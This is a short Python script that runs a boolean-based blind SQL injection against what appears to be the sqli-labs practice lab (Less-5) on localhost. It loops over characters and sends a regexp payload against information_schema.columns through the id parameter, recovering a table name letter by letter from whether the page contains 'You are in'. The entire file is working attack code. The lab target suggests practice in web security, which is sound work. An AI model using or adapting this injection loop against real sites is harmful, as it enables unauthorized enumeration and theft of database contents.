# -*-coding:utf8-*-
import requests
url = "http://localhost:81/SQLI-LABS/sqli-labs-master/Less-5/?id=1%s"
payload = "' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^%s[a-z\]' limit 0,1)--+"
result =''
print "start to get the result: "
for i in range(1, 10):
    for j in range(65,122):
        p = payload % (result+chr(j))
        response = requests.get(url % p)
        if response.content.find("You are in") != -1:
            result = result + chr(j)
            break
print ("the result is %s" % result)